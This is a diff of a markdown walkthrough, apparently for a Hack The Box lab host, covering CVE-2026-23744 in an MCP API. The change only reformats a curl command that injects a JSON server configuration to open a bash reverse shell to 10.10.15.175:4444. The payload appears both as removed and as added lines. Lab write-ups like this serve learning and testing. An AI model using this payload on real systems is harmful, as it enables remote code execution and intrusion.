@@ -9,17 +9,18 @@
 - CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
 - Payload Delivery: Utilizing `curl` to inject a malicious JSON configuration into the `/api/mcp/connect` endpoint.
 ## Reverse shell
-		curl -k https://mcp.kobold.htb:443/api/mcp/connect \
-		-H "Content-Type: application/json" \
-		-d '{
-			"serverConfig": {
-				"command":"/bin/bash",
-				"args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],
-				"env":{}
-			},
-			"serverId":"rev_shell"
-		}'
-			
+```bash
+curl -k https://mcp.kobold.htb:443/api/mcp/connect \
+-H "Content-Type: application/json" \
+-d '{
+	"serverConfig": {
+		"command":"/bin/bash",
+		"args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],
+		"env":{}
+	},
+	"serverId":"rev_shell"
+}'
+```		
 Establishing a callback to `10.10.15.175:4444` via bash interactive shell.
 
 ## Persistence and Stabilization
